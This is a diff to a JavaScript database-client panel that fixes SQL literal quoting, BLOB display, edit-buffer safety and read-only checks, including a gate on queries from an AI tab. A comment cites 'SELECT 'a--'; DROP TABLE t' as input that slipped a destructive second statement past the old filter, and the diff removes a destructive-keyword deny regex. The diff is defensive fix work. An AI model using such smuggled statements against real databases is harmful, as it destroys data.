@@ -13,6 +13,8 @@ import { defaultKeymap, history, historyKeymap, indentWithTab } from '@codemirro
 import { syntaxHighlighting, defaultHighlightStyle, indentOnInput, bracketMatching } from '@codemirror/language';
 import { autocompletion, completionKeymap, acceptCompletion } from '@codemirror/autocomplete';
 import { oneDark } from '@codemirror/theme-one-dark';
+import { liteEditorTheme } from '../codeedit.js';
+import { isReadOnlySql, stripSqlLiterals, splitSqlStatements, findSqlParams, substituteSqlParams } from '../../lib/sqlro.js';
 import { sql, PostgreSQL, MySQL, SQLite } from '@codemirror/lang-sql';
 
 const $ = (sel) => document.querySelector(sel);
@@ -50,6 +52,9 @@ export function initDb(host) {
     stopAutoRef();
     if (autoRefSec > 0) autoRefTimer = setInterval(() => {
       const t = findTab(activeKey);
+      // не поверх открытого редактора ячейки (перерисовка съела бы набранное) и не в свёрнутом окне
+      // (запросы к серверу БД каждые N секунд, которые никто не видит)
+      if (document.hidden || document.querySelector('.db-cell-edit')) return;
       if (t && t.kind === 'table' && t.mode !== 'structure' && !pendingCount(t) && !document.getElementById('db-valpanel')) { t._force = true; renderTabBody($('#db-tabbody')); }
     }, autoRefSec * 1000);
   }
@@ -69,7 +74,6 @@ export function initDb(host) {
     if (open) renderDbPanel();
     setTimeout(refitActiveTerminal, 150);
   }
-  function toggleDb() { setDbOpen(!dbOpen); }
   let restoredOnce = false;
   // ---- вкладки подключений: несколько открытых воркспейсов, полоса сверху панели
   let openConns = [];              // порядок вкладок: [connId]
@@ -106,13 +110,29 @@ export function initDb(host) {
   // ---- dialect-aware quoting (renderer side, for inline-edit & query builder)
   function qIdent(id) { return dbActiveConn && dbActiveConn.type === 'mysql' ? '`' + String(id).replace(/`/g, '``') + '`' : '"' + String(id).replace(/"/g, '""') + '"'; }
   function qual(schema, table) { if (dbActiveConn && dbActiveConn.type === 'sqlite') return qIdent(table); return (schema ? qIdent(schema) + '.' : '') + qIdent(table); }
-  function lit(v) { if (v == null) return 'NULL'; if (typeof v === 'number') return String(v); if (/^-?\d+(\.\d+)?$/.test(String(v))) return String(v); return "'" + String(v).replace(/'/g, "''") + "'"; }
-  // kept in sync with lib/db.js DESTRUCTIVE — covers SELECT INTO / COPY / ATTACH / CALL / … that
-  // would otherwise slip past a SELECT-prefix check and write to the DB or filesystem.
-  const DESTRUCTIVE_RE = /\b(insert|update|delete|drop|truncate|alter|create|grant|revoke|copy|merge|call|do|vacuum|reindex|attach|detach|lock|rename|into|load|handler|replace)\b/i;
-  function isDestructiveSql(s) { const t = String(s).replace(/--[^\n]*/g, '').replace(/\/\*[\s\S]*?\*\//g, '').replace(/'(?:[^']|'')*'/g, "''").replace(/"(?:[^"]|"")*"/g, '""'); return DESTRUCTIVE_RE.test(t); }
-  // strict read-only gate for the AI tab: not destructive AND starts with a read statement
-  function isReadOnlyQuery(s) { return !isDestructiveSql(s) && /^\s*\(*\s*(select|with|explain|show|describe|desc|pragma|table|values)\b/i.test(String(s)); }
+  // Литерал ЗНАЧЕНИЯ ячейки (фильтр, переход по FK, «ссылающиеся», IN-список, INSERT, предпросмотр правок):
+  // строка — всегда в кавычках. Раньше похожая на число строка шла без кавычек: текстовый ключ «0123»
+  // превращался в 123 — MySQL сравнивал числами и цеплял и «0123», и «123», Postgres падал на text = integer.
+  // Кавычки безопасны и для числовых колонок: все три СУБД приводят '5' к числу сами.
+  const hexOf = (b) => [...b].map((x) => x.toString(16).padStart(2, '0')).join('');
+  const isBinary = (v) => v instanceof Uint8Array;
+  function lit(v) {
+    if (v == null) return 'NULL';
+    if (typeof v === 'number') return String(v);
+    if (typeof v === 'boolean') return v ? 'TRUE' : 'FALSE';
+    if (isBinary(v)) return "X'" + hexOf(v).toUpperCase() + "'";   // BLOB MySQL/SQLite (bytea Postgres приходит текстом '\x…')
+    return "'" + String(v).replace(/'/g, "''") + "'";
+  }
+  // Значение :параметра, введённое руками: число без кавычек (LIMIT :n в MySQL кавычек не терпит), остальное — строкой.
+  function litParam(v) { if (v == null) return 'NULL'; return /^-?\d+(\.\d+)?$/.test(String(v)) ? String(v) : lit(v); }
+  // Изменяющий ли запрос — тем же разбором, что и бэкенд (lib/sqlro.js). Своя копия фильтра здесь
+  // снимала комментарии раньше строк: в «SELECT 'a--'; DROP TABLE t» она не видела DROP, и
+  // подтверждение PRODUCTION не спрашивалось; а REPLACE() (строковая функция) считался записью.
+  function isDestructiveSql(s) { return !isReadOnlySql(s); }
+  // Строгий допуск для AI-DB: не изменяющий И начинается с читающего оператора. Начало смотрим после
+  // снятия комментариев: запрос агента к другой базе начинается строкой «-- @db имя» и раньше
+  // отбраковывался как «не только чтение».
+  function isReadOnlyQuery(s) { return isReadOnlySql(s) && /^\s*\(*\s*(select|with|explain|show|describe|desc|pragma|table|values)\b/i.test(stripSqlLiterals(s)); }
   // confirm before a writing statement on a PRODUCTION-flagged connection
   function prodGuard(sqlText, run) { if (dbActiveConn && dbActiveConn.isProd && isDestructiveSql(sqlText)) showConfirm('PRODUCTION', `Подключение «${dbActiveConn.name}» помечено как PRODUCTION. Выполнить изменяющий запрос?`, 'Выполнить', run); else run(); }
 
@@ -379,6 +399,26 @@ export function initDb(host) {
     toast('SQL из вивера вставлен в консоль — проверьте и выполните', { ttl: 4500 });
   }
 
+  // Профиль открытого подключения изменили: окно держит его копию (dbActiveConn / снапшот вкладки),
+  // и без обновления PRODUCTION-предупреждение, «только чтение», имя и цвет оставались прежними до
+  // переоткрытия — изменяющий запрос на только что помеченной боевой базе уходил без подтверждения.
+  // Бэкенд после сохранения переподключается (параметры могли смениться) — схему перечитываем тоже.
+  function applySavedConn(conn) {
+    if (!conn || !openConns.includes(conn.id)) return;
+    if (conn.id === dbActiveId) {
+      dbActiveConn = conn;
+      dbSchema = null; dbColsCache = null; dbObjectsCache = null; dbRelationsCache = null; metaCache.clear();
+      aiExtrasByConn.delete(conn.id); invalidateTableCaches();
+      return;
+    }
+    const st = connStates.get(conn.id);
+    if (st) {
+      st.conn = conn; st.schema = null; st.cols = null; st.objects = null; st.relations = null; st.meta = new Map();
+      for (const tb of st.tabs || []) if (tb.kind === 'table') tb._force = true;
+      aiExtrasByConn.delete(conn.id);
+    }
+  }
+
   // ============================================================ connection modal (host + SSH)
   function dbConnModal(existing) {
     // existing: сохранённое подключение (есть id) ИЛИ черновик-префилл из контейнера (без id,
@@ -478,7 +518,7 @@ export function initDb(host) {
     const test = el('button', 'btn', 'Тест');
     test.onclick = async () => { status.textContent = 'Проверяю…'; status.className = 'db-test-status'; const r = await lite.db.test(collect()); if (r.ok) { status.textContent = '✓ ' + (r.version || 'подключение успешно'); status.classList.add('ok'); } else { status.textContent = '✕ ' + (r.error || 'не удалось'); status.classList.add('err'); } };
     const save = el('button', 'btn primary', 'Сохранить');
-    save.onclick = async () => { const o = collect(); if (!o.name) { toast('Введи имя', { kind: 'err' }); return; } const r = await lite.db.save(o); if (r && r.error) { toast(r.error, { kind: 'err' }); return; } close(); renderDbPanel(); };
+    save.onclick = async () => { const o = collect(); if (!o.name) { toast('Введи имя', { kind: 'err' }); return; } const r = await lite.db.save(o); if (r && r.error) { toast(r.error, { kind: 'err' }); return; } close(); applySavedConn(r && r.connection); renderDbPanel(); };
     const cancel = el('button', 'btn', 'Отмена'); cancel.onclick = close;
     row.append(test, save, cancel); f.appendChild(row); f.appendChild(status);
   }
@@ -672,7 +712,10 @@ export function initDb(host) {
   }
 
   // ============================================================ tabs
-  function tabKeyTable(schema, table) { return 'tbl:' + (schema || '') + '.' + table; }
+  // У SQLite одна схема «main»: дерево открывает таблицу с ней, а палитра, ER и переходы по FK —
+  // без схемы. Без нормализации одна таблица открывалась двумя вкладками.
+  const normSchema = (schema) => (dbActiveConn && dbActiveConn.type === 'sqlite' ? 'main' : schema);
+  function tabKeyTable(schema, table) { return 'tbl:' + (normSchema(schema) || '') + '.' + table; }
   function findTab(key) { return tabs.find((t) => t.key === key); }
   function activate(key) { if (wsView === 'ai' && setWsViewFn) setWsViewFn('desk'); activeKey = key; const body = $('#db-tabbody'); const bar = $('#db-tabbar'); if (bar) renderTabBar(bar, body); if (body) renderTabBody(body); highlightTreeActive(); }
   // mark the tree row matching the active table tab (visual aid)
@@ -691,12 +734,14 @@ export function initDb(host) {
     const body = $('#db-tabbody'); renderTabBar($('#db-tabbar'), body); renderTabBody(body);
   }
   function openTableTab(schema, table, view) {
+    schema = normSchema(schema);
     const key = tabKeyTable(schema, table);
     if (!findTab(key)) tabs.push({ key, kind: 'table', schema, table, view, title: table, page: 0, orderBy: null, orderDir: 'asc', where: '', mode: 'data' });
     recordNav(key); activate(key);
   }
   // open a table filtered by a predicate (used by FK navigation)
   function openTableFiltered(schema, table, whereSql) {
+    schema = normSchema(schema);
     const key = tabKeyTable(schema, table);
     let t = findTab(key);
     if (!t) { t = { key, kind: 'table', schema, table, view: false, title: table, page: 0, orderBy: null, orderDir: 'asc', where: whereSql, mode: 'data' }; tabs.push(t); }
@@ -774,7 +819,7 @@ export function initDb(host) {
 
     t.buffer = t.buffer || { edits: {}, deletes: new Set(), inserts: [] };
     // any pending change blocks a reload that would silently drop it
-    const guard = (fn) => { if (pendingCount(t)) { showConfirm('Отменить правки?', `Несохранённых изменений: ${pendingCount(t)}. Перезагрузка их сбросит.`, 'Отменить правки', () => { clearBuffer(t); fn(); }); } else fn(); };
+    const guard = (fn) => guardPending(t, fn);
 
     // filter bar
     const fbar = el('div', 'db-filterbar');
@@ -794,7 +839,11 @@ export function initDb(host) {
     // local cache: a plain tab switch reuses t.lastResult; a genuine param change (page/sort/filter),
     // the Обновить button, or the auto-refresh timer set t._force to re-query the backend.
     const dataKey = JSON.stringify({ p: t.page, ob: t.orderBy, od: t.orderDir, w: t.where || '' });
-    const useCache = !t._force && t.lastResult && !t.lastResult.error && t._dataKey === dataKey;
+    // Страховка: пока в буфере есть правки, строки НЕ перезапрашиваем ни по какому поводу (сброс кэшей
+    // после коммита на соседней вкладке, «Обновить схему», переподключение). Правки адресуются номером
+    // строки, и после перезапроса «Применить» ушло бы в WHERE pk чужих строк.
+    const keepForEdits = pendingCount(t) > 0 && t.lastResult && !t.lastResult.error;
+    const useCache = keepForEdits || (!t._force && t.lastResult && !t.lastResult.error && t._dataKey === dataKey);
     let r;
     if (useCache) { r = t.lastResult; }
     else {
@@ -846,7 +895,7 @@ export function initDb(host) {
   // ---- merged refresh + auto-refresh interval control (DataGrip-style)
   function autoRefWidget(t) {
     const wrap = el('div', 'db-autoref');
-    const refr = iconBtn('drow-act', 'refresh', 'Обновить данные', 14); refr.onclick = () => { t._force = true; renderTabBody($('#db-tabbody')); };
+    const refr = iconBtn('drow-act', 'refresh', 'Обновить данные', 14); refr.onclick = () => guardPending(t, () => { t._force = true; renderTabBody($('#db-tabbody')); });
     const intBtn = el('button', 'db-autoref-int' + (autoRefSec > 0 ? ' on' : ''));
     intBtn.append(icon(autoRefSec > 0 ? 'clock' : 'clock', 12), el('span', null, autoRefSec > 0 ? fmtInterval(autoRefSec) : 'авто'));
     intBtn.title = 'Автообновление таблицы';
@@ -913,6 +962,12 @@ export function initDb(host) {
   }
 
   // ---- edit buffer: pending edits / deletes / inserts → transactional commit
+  // Перезапрос таблицы с несохранёнными правками: сперва спросить и сбросить буфер (правки хранятся
+  // по номеру строки, после перезапроса номера указывали бы на другие строки).
+  function guardPending(t, fn) {
+    if (!pendingCount(t)) { fn(); return; }
+    showConfirm('Отменить правки?', `Несохранённых изменений: ${pendingCount(t)}. Перезагрузка их сбросит.`, 'Отменить правки', () => { clearBuffer(t); fn(); });
+  }
   function pendingCount(t) { const b = t.buffer; if (!b) return 0; return Object.keys(b.edits).length + b.deletes.size + b.inserts.filter((o) => Object.keys(o).length).length; }
   function clearBuffer(t) { t.buffer = { edits: {}, deletes: new Set(), inserts: [] }; }
   // force every open table tab to re-query on its next render (after a commit / schema refresh)
@@ -1017,7 +1072,13 @@ export function initDb(host) {
   }
 
   // ============================================================ GRID (typed, sortable, resizable, selectable)
-  function fmtVal(v) { if (v === null || v === undefined) return null; if (typeof v === 'object') return JSON.stringify(v); return String(v); }
+  // Двоичное (BLOB MySQL/SQLite приходит Uint8Array) — hex, а не JSON-объект {"0":137,"1":80,…}.
+  function fmtVal(v) {
+    if (v === null || v === undefined) return null;
+    if (isBinary(v)) return '0x' + hexOf(v.length > 256 ? v.subarray(0, 256) : v).toUpperCase() + (v.length > 256 ? `… (${v.length} Б)` : '');
+    if (typeof v === 'object') return JSON.stringify(v);
+    return String(v);
+  }
   function paintCell(td, v) { const s = fmtVal(v); if (s === null) { td.textContent = 'NULL'; td.classList.add('db-null'); } else { td.classList.remove('db-null'); let disp = s; if (disp.length > 300) disp = disp.slice(0, 300) + '…'; td.textContent = disp; } }
   const trimNum = (n) => Number.isInteger(n) ? String(n) : (Math.abs(n) >= 1000 ? n.toFixed(2) : n.toPrecision(6).replace(/\.?0+$/, ''));
   function fmtStats(stat) { if (!stat) return ''; let s = `выбрано ячеек: ${stat.count}`; if (stat.num) s += `  ·  сумма ${trimNum(stat.sum)}  ·  сред. ${trimNum(stat.avg)}  ·  мин ${trimNum(stat.min)}  ·  макс ${trimNum(stat.max)}  ·  чисел ${stat.num}`; return s; }
@@ -1141,7 +1202,7 @@ export function initDb(host) {
           beginDrag(); sel.clear(); anchor = [ri, ci]; cur = [ri, ci]; sel.add(cellKey(ri, ci)); paintSel(); reportSel(); if (document.getElementById('db-valpanel')) showCellValue(v, columns[ci]); wrap.focus({ preventScroll: true });
         };
         td.onmouseenter = () => { if (dragging && anchor) { sel.clear(); const [ar, ac] = anchor; for (let r = Math.min(ar, ri); r <= Math.max(ar, ri); r++) for (let c = Math.min(ac, ci); c <= Math.max(ac, ci); c++) sel.add(cellKey(r, c)); paintSel(); reportSel(); } };
-        if (editable && buffer) td.ondblclick = () => startEdit(td, ri, ci, v, false);
+        if (editable && buffer) td.ondblclick = () => startEdit(td, ri, ci, v);
         if (onCellMenu) td.oncontextmenu = (e) => { e.preventDefault(); onCellMenu(e, v, columns[ci], rowv, ri, { size: sel.size, text: selText }); };
         tr.appendChild(td);
       }
@@ -1161,10 +1222,14 @@ export function initDb(host) {
       return tr;
     }
     function startEdit(td, ri, ci, v) {
-      const inp = el('input', 'db-cell-edit'); inp.value = v == null ? '' : String(v);
+      if (isBinary(v)) { toast('Двоичные данные в таблице не правятся — используйте SQL-консоль'); return; }
+      // в поле — текст значения (объект JSON — как JSON, а не «[object Object]»)
+      const start = v == null ? '' : fmtVal(v);
+      const inp = el('input', 'db-cell-edit'); inp.value = start;
       td.textContent = ''; td.appendChild(inp); inp.focus(); inp.select();
       const fin = (commit) => {
-        if (commit) { const nv = inp.value === '' ? null : inp.value; buffer.edits[ri] = buffer.edits[ri] || {}; buffer.edits[ri][columns[ci]] = nv; td.classList.add('db-edited'); paintCell(td, nv); onBufferChange && onBufferChange(); }
+        // клик мимо без изменений — не правка: раньше любой двойной клик и уход фокуса записывали ячейку в буфер
+        if (commit && inp.value !== start) { const nv = inp.value === '' ? null : inp.value; buffer.edits[ri] = buffer.edits[ri] || {}; buffer.edits[ri][columns[ci]] = nv; td.classList.add('db-edited'); paintCell(td, nv); onBufferChange && onBufferChange(); }
         else paintCell(td, v);
       };
       inp.onblur = () => fin(true);
@@ -1212,7 +1277,12 @@ export function initDb(host) {
         setCur(r, c, e.shiftKey); return;
       }
       if (e.key === 'Escape') { sel.clear(); cur = null; paintSel(); reportSel(); return; }
-      if (e.key === 'Enter' && editable && buffer && cur) { e.preventDefault(); const td = tb.querySelector(`td[data-r="${cur[0]}"][data-c="${cur[1]}"]`); if (td) startEdit(td, cur[0], cur[1], rows[cur[0]][cur[1]]); }
+      if (e.key === 'Enter' && editable && buffer && cur) {
+        e.preventDefault();
+        const [er, ec] = cur; const td = tb.querySelector(`td[data-r="${er}"][data-c="${ec}"]`);
+        const ed = buffer.edits[er]; const cv = ed && (columns[ec] in ed) ? ed[columns[ec]] : rows[er][ec];   // уже исправленная ячейка — с правкой, а не с исходным значением
+        if (td) startEdit(td, er, ec, cv);
+      }
     });
     function addInsertRow() { if (!editable || !buffer) return; buffer.inserts.push({}); tb.appendChild(insertRow(buffer.inserts[buffer.inserts.length - 1], buffer.inserts.length - 1)); onBufferChange && onBufferChange(); }
     return { element: wrap, addInsertRow, selection: () => [...sel].map((k) => k.split(':').map(Number)) };
@@ -1234,6 +1304,7 @@ export function initDb(host) {
   // cell value viewer — right slide-in panel with JSON auto-detect, syntax highlight, fold/unfold
   function detectValue(v) {
     if (v == null) return { kind: 'null' };
+    if (isBinary(v)) return { kind: 'text', text: fmtVal(v) };
     if (typeof v === 'object') return { kind: 'json', data: v };
     const s = String(v);
     if (typeof v === 'boolean') return { kind: 'bool', text: s };
@@ -1335,7 +1406,7 @@ export function initDb(host) {
       jvRender(body, root);
     } else {
       const copy = iconBtn('drow-act', 'copy', 'Копировать значение', 13);
-      copy.onclick = () => { lite.copyText(v == null ? '' : (typeof v === 'object' ? JSON.stringify(v, null, 2) : String(v))); toast('Скопировано'); };
+      copy.onclick = () => { lite.copyText(v == null ? '' : (isBinary(v) ? fmtVal(v) : typeof v === 'object' ? JSON.stringify(v, null, 2) : String(v))); toast('Скопировано'); };
       head.append(copy);
       if (det.kind === 'null') { const p = el('pre', 'db-valpanel-pre db-null'); p.textContent = 'NULL'; body.appendChild(p); }
       else { const p = el('pre', 'db-valpanel-pre'); p.textContent = det.text; if (det.kind === 'number') p.classList.add('jv-num'); body.appendChild(p); }
@@ -1377,7 +1448,7 @@ export function initDb(host) {
       extensions: [
         lineNumbers(), history(), drawSelection(), indentOnInput(), bracketMatching(),
         autocompletion(), syntaxHighlighting(defaultHighlightStyle),
-        sql({ dialect: dbDialect(), schema: schemaObj }), oneDark,
+        sql({ dialect: dbDialect(), schema: schemaObj }), oneDark, liteEditorTheme,
         keymap.of([
           { key: 'Ctrl-Enter', run: () => { runSql(t); return true; } },
           { key: 'Mod-Enter', run: () => { runSql(t); return true; } },
@@ -1393,24 +1464,29 @@ export function initDb(host) {
     const ed = t.editor; if (!ed) return '';
     const sel = ed.state.selection.main;
     if (!sel.empty) return ed.state.sliceDoc(sel.from, sel.to).trim();
-    // statement under cursor: split whole doc by ';' and find the segment containing the cursor
+    // Оператор под курсором: «;» ищем только в коде (не в строках, комментариях и $$-телах функций).
+    // Курсор после «;» в конце строки или на пустой строке — берём ближайший оператор выше, а не весь текст.
     const doc = ed.state.doc.toString(); const pos = sel.head;
-    let start = doc.lastIndexOf(';', pos - 1) + 1; let end = doc.indexOf(';', pos); if (end < 0) end = doc.length;
-    const stmt = doc.slice(start, end).trim();
-    return stmt || doc.trim();
+    const ranges = splitSqlStatements(doc);
+    const textOf = (r) => doc.slice(r.from, r.to).trim();
+    const empty = (r) => !stripSqlLiterals(doc.slice(r.from, r.to)).trim();
+    let k = ranges.findIndex((r) => pos >= r.from && pos <= r.to);
+    if (k < 0) k = ranges.length - 1;
+    while (k > 0 && empty(ranges[k])) k--;
+    return empty(ranges[k]) ? doc.trim() : textOf(ranges[k]);
   }
-  async function runSql(t, explain) {
+  async function runSql(t) {
     if (!t.editor) return;
-    let text = currentSqlText(t); if (!text) return;
-    if (explain) text = 'EXPLAIN ' + text.replace(/;\s*$/, '');
+    const text = currentSqlText(t); if (!text) return;
     runWithParams(text, (finalText) => {
       if (dbActiveConn && dbActiveConn.isProd && isDestructiveSql(finalText)) { prodGuard(finalText, () => execSql(t, finalText)); return; }
       execSql(t, finalText);
     });
   }
-  // substitute :name parameters via a prompt before running (skips ::casts and array-slices follow no \w)
+  // Подстановка :name перед запуском. Параметры ищутся только в коде (lib/sqlro.js): «'10:30'» или «'a:b'»
+  // в строке раньше тоже считались параметрами и подменялись значением прямо внутри литерала.
   function runWithParams(text, cont, onCancel) {
-    const names = [...new Set([...text.matchAll(/(?<!:):([A-Za-z_]\w*)/g)].map((m) => m[1]))];
+    const names = findSqlParams(text);
     if (!names.length) { cont(text); return; }
     let settled = false;   // отмену тоже сообщаем — вызывающий может ждать ответа промисом
     const finish = (v) => { if (settled) return; settled = true; if (v == null) { if (onCancel) onCancel(); } else cont(v); };
@@ -1419,7 +1495,7 @@ export function initDb(host) {
     const host = m.querySelector('#dbparams'); const ins = {};
     for (const n of names) { const w = el('div', 'db-field'); w.append(el('label', null, ':' + n)); const i = el('input'); ins[n] = i; w.append(i); host.appendChild(w); }
     const acts = el('div', 'gm-actions'); acts.style.marginTop = '10px';
-    const ok = el('button', 'btn primary', 'Выполнить'); ok.onclick = () => { let out = text; for (const n of names) out = out.replace(new RegExp('(?<!:):' + n + '\\b', 'g'), lit(ins[n].value === '' ? null : ins[n].value)); finish(out); close(); };
+    const ok = el('button', 'btn primary', 'Выполнить'); ok.onclick = () => { const out = substituteSqlParams(text, (n) => (ins[n] ? litParam(ins[n].value === '' ? null : ins[n].value) : ':' + n)); finish(out); close(); };
     const cancel = el('button', 'btn', 'Отмена'); cancel.onclick = () => { finish(null); close(); };
     acts.append(ok, cancel); host.appendChild(acts);
     setTimeout(() => ins[names[0]].focus(), 30);
@@ -1438,8 +1514,8 @@ export function initDb(host) {
     res.innerHTML = '';
     if (r.error) { res.appendChild(el('div', 'docker-err', r.error)); return; }
     r._ms = ms; t.lastResult = r; showSqlResult(t, r);
-    // a DDL/DML run may have changed the schema → drop caches
-    dbSchema = null; metaCache.clear(); dbRelationsCache = null;
+    // a DDL/DML run may have changed the schema → drop caches (обычный SELECT схему не меняет)
+    if (isDestructiveSql(text)) { dbSchema = null; metaCache.clear(); dbRelationsCache = null; }
   }
   // ---- graphical EXPLAIN
   async function explainQuery(t) {
@@ -1495,7 +1571,7 @@ export function initDb(host) {
       res.appendChild(info);
       let sortState = null; const rows = r.rows.slice();
       const selFoot = el('div', 'db-selfoot');
-      const rerender = () => { res.querySelector('.db-grid')?.remove(); const g = makeGrid({ columns: r.columns, colTypes: r.colTypes, rows, sortState, onSelStats: (st) => { selFoot.textContent = fmtStats(st); selFoot.classList.toggle('on', !!st); }, onSort: (col) => { const ci = r.columns.indexOf(col); if (sortState && sortState.col === col) sortState.dir = sortState.dir === 'asc' ? 'desc' : 'asc'; else sortState = { col, dir: 'asc' }; rows.sort((a, b) => { const x = a[ci], y = b[ci]; if (x == null) return 1; if (y == null) return -1; return (x > y ? 1 : x < y ? -1 : 0) * (sortState.dir === 'asc' ? 1 : -1); }); rerender(); }, onCellMenu: (e, val, colName, _rv, _ri, selInfo) => cellMenu(e, val, colName, null, null, r.columns, null, null, r, selInfo) }); res.insertBefore(g.element, selFoot); };
+      const rerender = () => { res.querySelector('.db-grid')?.remove(); const g = makeGrid({ columns: r.columns, colTypes: r.colTypes, rows, sortState, onSelStats: (st) => { selFoot.textContent = fmtStats(st); selFoot.classList.toggle('on', !!st); }, onSort: (col) => { const ci = r.columns.indexOf(col); if (sortState && sortState.col === col) sortState.dir = sortState.dir === 'asc' ? 'desc' : 'asc'; else sortState = { col, dir: 'asc' }; const numeric = r.colTypes && r.colTypes[ci] === 'number'; rows.sort((a, b) => { let x = a[ci], y = b[ci]; if (x == null) return 1; if (y == null) return -1; if (numeric) { x = Number(x); y = Number(y); } return (x > y ? 1 : x < y ? -1 : 0) * (sortState.dir === 'asc' ? 1 : -1); }); rerender(); }, onCellMenu: (e, val, colName, _rv, _ri, selInfo) => cellMenu(e, val, colName, null, null, r.columns, null, null, r, selInfo) }); res.insertBefore(g.element, selFoot); };
       res.appendChild(selFoot); rerender();
     } else {
       res.appendChild(el('div', 'db-result-info', `Готово${r.rowCount != null ? ` · затронуто строк: ${r.rowCount}` : ''}${r._ms != null ? ` · ${r._ms} мс` : ''}`));
@@ -1585,7 +1661,7 @@ export function initDb(host) {
     }
     if (t && columns) {
       items.push({ sep: true });
-      items.push({ label: `Фильтр: ${colName} = …`, action: () => { t.where = `${qIdent(colName)} = ${lit(val)}`; t.page = 0; renderTabBody($('#db-tabbody')); } });
+      items.push({ label: `Фильтр: ${colName} = …`, action: () => guardPending(t, () => { t.where = `${qIdent(colName)} = ${lit(val)}`; t.page = 0; renderTabBody($('#db-tabbody')); }) });
       const col = meta && meta.columns && meta.columns.find((c) => c.name === colName);
       if (col && col.fk && val != null) {
         items.push({ label: `→ Перейти: ${col.fk.table}.${col.fk.column}`, action: () => openTableFiltered(col.fk.schema || t.schema, col.fk.table, `${qIdent(col.fk.column)} = ${lit(val)}`) });
@@ -1639,8 +1715,8 @@ export function initDb(host) {
   function labelChk(text, node) { const w = el('label', 'db-check'); w.append(node, document.createTextNode(' ' + text)); return w; }
   function headerMenu(e, colName, t, meta) {
     showMenu(e.clientX, e.clientY, [
-      { label: 'Сортировать ↑', action: () => { t.orderBy = colName; t.orderDir = 'asc'; t.page = 0; renderTabBody($('#db-tabbody')); } },
-      { label: 'Сортировать ↓', action: () => { t.orderBy = colName; t.orderDir = 'desc'; t.page = 0; renderTabBody($('#db-tabbody')); } },
+      { label: 'Сортировать ↑', action: () => guardPending(t, () => { t.orderBy = colName; t.orderDir = 'asc'; t.page = 0; renderTabBody($('#db-tabbody')); }) },
+      { label: 'Сортировать ↓', action: () => guardPending(t, () => { t.orderBy = colName; t.orderDir = 'desc'; t.page = 0; renderTabBody($('#db-tabbody')); }) },
       { sep: true },
       { label: 'Профайлинг колонки', action: () => profileColumn(t, colName, meta) },
       { label: 'Копировать имя колонки', action: () => { lite.copyText(colName); toast('Скопировано'); } },
@@ -1679,10 +1755,7 @@ export function initDb(host) {
       topHost.appendChild(row);
     }
   }
-  // ---- mini charts (SVG, no deps)
-  // ── charts (Chart.js, statically imported): many types + PNG export ──
-  const _ChartLib = Chart;
-  async function loadChartLib() { return _ChartLib; }
+  // ── графики (Chart.js, статический импорт): несколько типов + выгрузка PNG ──
   const CHART_TYPES = [
     { id: 'bar', label: 'Столбцы' }, { id: 'line', label: 'Линия' }, { id: 'area', label: 'Область' },
     { id: 'horizontalBar', label: 'Гориз. столбцы' }, { id: 'pie', label: 'Круговая' }, { id: 'doughnut', label: 'Кольцо' },
@@ -1711,8 +1784,6 @@ export function initDb(host) {
   }
   async function renderChartCanvas(container, type, columns, rows, spec, opts = {}) {
     container.innerHTML = '';
-    const Chart = await loadChartLib();
-    if (!Chart) { container.appendChild(el('div', 'docker-err', 'Библиотека графиков не загрузилась')); return null; }
     const wrap = el('div', 'db-chart-canvaswrap'); const canvas = document.createElement('canvas'); wrap.appendChild(canvas); container.appendChild(wrap);
     let instance;
     try { instance = new Chart(canvas, buildChartConfig(type, columns, rows, spec)); }
@@ -1723,7 +1794,7 @@ export function initDb(host) {
   }
   function downloadCanvas(canvas, name) { try { const a = document.createElement('a'); a.href = canvas.toDataURL('image/png'); a.download = (name || 'chart').replace(/[^\w.-]+/g, '_') + '.png'; a.click(); } catch (_) { toast('Не удалось сохранить картинку', { kind: 'err' }); } }
   // destroy Chart.js instances under a root before it's torn down (avoids leaking instances)
-  function destroyChartsIn(root) { if (!_ChartLib || !root) return; root.querySelectorAll('canvas').forEach((cv) => { const c = _ChartLib.getChart && _ChartLib.getChart(cv); if (c) { try { c.destroy(); } catch (_) {} } }); }
+  function destroyChartsIn(root) { if (!root) return; root.querySelectorAll('canvas').forEach((cv) => { const c = Chart.getChart(cv); if (c) { try { c.destroy(); } catch (_) {} } }); }
   function openChart(columns, colTypes, rows) {
     if (!rows || !rows.length) { toast('Нет данных для графика'); return; }
     const { m } = makeModal('<h2>График</h2>', () => { if (cur && cur.instance) { try { cur.instance.destroy(); } catch (_) {} } }); m.classList.add('db-modal', 'db-chart-modal');
@@ -1747,10 +1818,11 @@ export function initDb(host) {
   }
   function copyResultAs(fmt, columns, rows, name) {
     let text;
-    if (fmt === 'markdown') { text = '| ' + columns.join(' | ') + ' |\n| ' + columns.map(() => '---').join(' | ') + ' |\n' + rows.map((r) => '| ' + r.map((v) => v == null ? '' : String(typeof v === 'object' ? JSON.stringify(v) : v).replace(/\|/g, '\\|').replace(/\n/g, ' ')).join(' | ') + ' |').join('\n'); }
-    else if (fmt === 'csv') { const esc = (v) => v == null ? '' : /[",\n]/.test(String(v)) ? '"' + String(v).replace(/"/g, '""') + '"' : String(v); text = [columns.join(','), ...rows.map((r) => r.map(esc).join(','))].join('\n'); }
-    else if (fmt === 'json') { text = JSON.stringify(rows.map((r) => Object.fromEntries(columns.map((c, i) => [c, r[i]]))), null, 2); }
-    else { text = rows.map((r) => `INSERT INTO ${name || 'tbl'} (${columns.join(', ')}) VALUES (${r.map(lit).join(', ')});`).join('\n'); }
+    const cell = (v) => (v == null ? '' : fmtVal(v));   // двоичные — hex, JSON — текстом
+    if (fmt === 'markdown') { text = '| ' + columns.join(' | ') + ' |\n| ' + columns.map(() => '---').join(' | ') + ' |\n' + rows.map((r) => '| ' + r.map((v) => cell(v).replace(/\|/g, '\\|').replace(/\n/g, ' ')).join(' | ') + ' |').join('\n'); }
+    else if (fmt === 'csv') { const esc = (v) => { const c = cell(v); return /[",\n]/.test(c) ? '"' + c.replace(/"/g, '""') + '"' : c; }; text = [columns.join(','), ...rows.map((r) => r.map(esc).join(','))].join('\n'); }
+    else if (fmt === 'json') { text = JSON.stringify(rows.map((r) => Object.fromEntries(columns.map((c, i) => [c, isBinary(r[i]) ? fmtVal(r[i]) : r[i]]))), null, 2); }
+    else { text = rows.map((r) => `INSERT INTO ${qIdent(name || 'tbl')} (${columns.map(qIdent).join(', ')}) VALUES (${r.map(lit).join(', ')});`).join('\n'); }
     lite.copyText(text); toast(`Скопировано строк: ${rows.length}`);
   }
   // reverse-FK: tables whose foreign key points at t.table.colName → open filtered by the value
@@ -1784,16 +1856,19 @@ export function initDb(host) {
   ];
